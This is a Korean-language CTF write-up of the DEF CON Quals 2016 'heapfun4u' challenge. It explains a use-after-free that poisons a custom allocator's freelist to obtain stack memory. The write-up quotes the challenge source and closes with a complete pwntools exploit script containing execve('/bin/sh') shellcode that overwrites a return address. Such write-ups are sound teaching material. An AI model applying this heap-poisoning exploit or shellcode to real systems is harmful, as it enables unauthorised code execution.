---
title: "[DEFCON Quals 2016] Heapfun4u"
tags: writeup ctf
toc: true
---


## Introduction

본 문제는 use-after-free (UAF)를 사용하여 커스텀 메모리 할당자의 freelist를 조작하여 스택을 할당하고 쉘을
얻을 수 있는지 묻는 문제이다.

<br>

주어진 커스텀 할당자는 메모리 블록에 header와 footer를 두고, header에 크기, footer에 연결 리스트 정보를
기록한다. 그리고 특정 조건에서 연결 리스트 정보를 freelist로 사용한다. 이때 스택 주소를 얻을 수 있는 명령어룰
문제에서 제공하므로 freelist를 조작하여 스택 영역 메모리를 할당받을 수 있다. 게다가 이 할당자가 얻는
메뫼리에는 실행 권한이 포함되어 있기 때문에 정상적으로 얻은 메모리에 쉘 코드를 쓰고 이 주소로 리턴 주소를
덮어쓰면 풀 수 있다.

<br>

이 문제의 소스 코드는 깃허브에 올려져 있는 자료를 참고하면 된다\[1, 2\].

## Vulnerability

주어진 소스 코드 중 heapfun4u.c 파일을 보면 할당된 메모리가 기록된 array 배열의 원소를 해제된 후에도 그 값을
유지하여 UAF가 가능함을 알 수 있다.

``` c
#include <stdio.h>
#include <string.h>
#include "dc_malloc.h"

void *array[100];
int array_sz[100];
int c;

void print_array()
{
  int i =0;

  for ( i = 0; i < 100; i++) {
      if ( array[i] == NULL ) {
          continue;
      }

      printf("%d) %p -- %d\n", i+1, array[i], array_sz[i]);
  }

  return;
}

void name( void )
{
  int hello;

  printf("Here you go: %p\n", &hello);

  return;
}

void wb( )
{
  char stuff[16];
  int sel = 0;

  print_array();

  printf("Write where: ");
  if ( read( 0, stuff, 15) <= 0 ) {
      exit(0);
  }

  sel = atoi(stuff) - 1;

  if ( sel < 0 || sel >= 100 ) {
      exit(0);
  }

  if ( !array[sel] ) {
      exit(0);
  }

  printf("Write what: ");

  if ( read( 0, array[sel], array_sz[sel]) <= 0 ) {
      exit(0);
  }


  return;
}

int main()
{
  memset( array, 0, sizeof(void*) * 100);
  c = 0;
  int sel = 0;
  char yo[256];

  setvbuf( stdin, NULL, _IONBF, 0 );
  setvbuf( stdout, NULL, _IONBF, 0 );

  while ( 1 ) {
      printf("[A]llocate Buffer\n");
      printf("[F]ree Buffer\n");
      printf("[W]rite Buffer\n");
      printf("[N]ice guy\n");
      printf("[E]xit\n");
      printf("| ");

      if ( read( 0,  yo, 255) <= 0 ) {
          exit(0);
      }

      switch( yo[0] ) {
          case 'A':
              if ( c == 100) {
                  exit(0);
              }

              printf("Size: ");

              if ( read(0,yo, 255) <= 0 ) {
                  exit(0);
              }

              sel = atoi( yo );
              array[c] = dc_malloc(sel);
              array_sz[c] = sel;

              if ( !array[c] ) {
                  exit(0);
              }

              c++;

              break;
          case 'F':
              print_array();
              printf("Index: ");

              if ( read( 0, yo, 256) <= 0 ) {
                  exit(0);
              }

              sel = atoi(yo) - 1;

              if ( sel < 0 || sel >=100) {
                  exit(0);
              }

              if ( array[sel] ) {
                  dc_free( array[sel] );
              } else {
                  exit(0);
              }

              break;
          case 'W':
              wb();
              break;
          case 'N':
              name();
              break;
          case 'E':
              printf("Leave\n");
              return 0;
          default:
              exit(0);
              break;
      };      
  }

  return 0;
}
```

## Exploit

주어진 dc\_malloc은 메모리 블록에 다음과 같이 header와 footer를 둔다.

``` c
typedef struct m_header {
  /// 8 byte aligned so 3 bits for flags
  unsigned long size;
} m_header, *pm_header;

typedef struct m_footer {
  m_header *pNext;
  m_header *pPrev;
} m_footer, *pm_footer;
```

그리고 메모리 관리자 타입을 다음과 같이 정의한다.

``` c
typedef struct m_manager {
  void *free_list;
} m_manager, *pm_manager;
```

Freelist는 전역 변수로 관리되며, dc\_malloc 함수 구현을 보면 특정 조건에서 메모리 블록의
footer로 그 값을 정한다 ({1}).

``` c
void *dc_malloc( unsigned int size )
{
  void *freeWalker = NULL;
  void *final_alloc = NULL;
  void *new_block = NULL;
  unsigned int size_left = 0;

  pm_header thdr;
  pm_footer tftr;
  pm_header header_new_block;
  pm_footer footer_new_block;

  /// Each block needs to be a least the size of the footer structure
  if ( size < sizeof( m_footer ) ) {
      size = sizeof(m_footer);
  }

  /// Align to 8 bytes
  if ( size % 8 ) {
      size = ( size >> 3 ) + 1;
      size <<= 3;
  }

  freeWalker = memman_g.free_list;

  while ( 1 ) {
      if ( freeWalker == NULL ) {
          freeWalker = add_free_block( size );
      }

      thdr = (pm_header)freeWalker;
      tftr = BLOCK_FOOTER( freeWalker );

      /// Check if the current block is large enough to fulfill the request
      /// If so then downsize as needed
      if ( ( thdr->size & ~3) >= size ) {
          final_alloc = freeWalker + sizeof(pm_header);

          size_left = (thdr->size& ~3) - size;

          /// Set the in use flag
          thdr->size |= 1;

          // If there is room then create a new block
          if ( size_left > sizeof(m_header) + sizeof( m_footer) ) {
                /* ... */
          } else {

              /// Just unlink and return this one
              if ( freeWalker == memman_g.free_list ) {
                  memman_g.free_list = tftr->pNext; /* {1} */

                  if ( memman_g.free_list ) {
                      tftr = BLOCK_FOOTER( (void*)(memman_g.free_list) );
                      tftr->pPrev = NULL;
                  }

              } else {
                    /* ... */
              }
          }

          /// Fix ups are done. Return the allocation
          return final_alloc;
      }

      freeWalker = (void*)tftr->pNext;

  }
}
```

이때 BLOCK\_FOOTER() 매크로의 정의를 보면 알 수 있듯이, {1}에서의 pNext 멤버는 유효한
주소이어야만 하고, 적절한 크기값을 담은 주소여야만 한다.

``` c
#define BLOCK_FOOTER( block ) ((pm_footer)(  ((char *)block) + (( ( ((pm_header)block)->size & ~3) + sizeof(m_header) ) - sizeof( m_footer))))
```

<br>

그럼 상기 name 함수로 스택 주소를 얻고 적당한 스택 주소를 해제된 메모리 footer의 pNext 멤버에 둔다면 그 다음
할당에서 그 주소가 memman\_g.freelist로 들어갈 것이다. 그럼 그 다음 할당에서 스택 주소를
얻을 수 있다. 이때 스택 주소는 메모리 블록을 할당할 때 메모리 크기를 입력받는 버퍼의 주소를 쓰는데, 그 주소에 2를 더한 값을
쓴다. 그 이유는 "128\n"을 입력했을 때 "8\n"을 크기 값으로, 즉 0x0a38을 쓰게되어 리턴 주소를 덮어쓰기에 충분하면서도
세그멘테이션 폴트를 발생시키지 않기 때문이다. 이 방법에는 별도의 추가 입력이 필요하지 않기도 하다. 이렇게 스택을
할당받았다면 다음은 또다른 메모리 블록에 쉘 코드를 쓰고 그 블록으로 점프하도록 리턴 주소를 덮어쓰는
것이다. 지금까지 설명한 것을 코드로 작성하면 다음과 같다.

``` python
from pwn import *
import time

r = process("./heapfun4u")

def allocate(r, size):
    r.sendlineafter(b"| ", b'A')
    r.sendlineafter(b": ", size)

def free(r, mem_index):
    r.sendlineafter(b"| ", b'F')
    r.sendlineafter(b": ", mem_index)

def write(r, mem_index, data, add_nl):
    r.sendlineafter(b"| ", b'W')
    r.sendafter(b": ", mem_index)

    if add_nl:
        r.sendlineafter(b": ", data)
    else:
        r.sendafter(b": ", data)

def get_stack(r):
    r.sendlineafter(b"| ", b'N')
    line = r.recvline()
    stack = int(line[len(b"Here you go: "):-1], 16)
    print(hex(stack))
    return stack

def exit(r):
    r.sendlineafter(b"| ", b'E')

def main():
    stack = get_stack(r)
    fake_block = stack + 0x14 + 0x2
    main_ret_off = 0x11e

    print(hex(fake_block))

    allocate(r, b"128")
    allocate(r, b"128")
    free(r, b'1')

    payload = b'A' * 0x70
    payload += p64(fake_block)
    write(r, b"1", payload, False)

    allocate(r, b"128")
    time.sleep(1)
    allocate(r, b"304")

    r.sendlineafter(b"| ", b'W')
    heap = int(r.recvline()[3:17], 16)
    print(hex(heap))
    r.sendlineafter(b": ", b'1')
    payload = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05\x90\x90"
    r.sendafter(b": ", payload)

    payload = b'A' * main_ret_off
    payload += p64(heap)
    write(r, b'4', payload, False)

    exit(r)

    r.interactive()

main()
```

## References

1.  "DEF CON Capture the Flag 2016." legitbs.net, Accessed: May. 04,
    2026. \[Online\]. Available: <https://legitbs.net/2016/>
2.  legitbs, "creative commons." github.com, Accessed: May. 04, 2026.
    \[Online\]. Available: <https://github.com/legitbs/quals-2016>
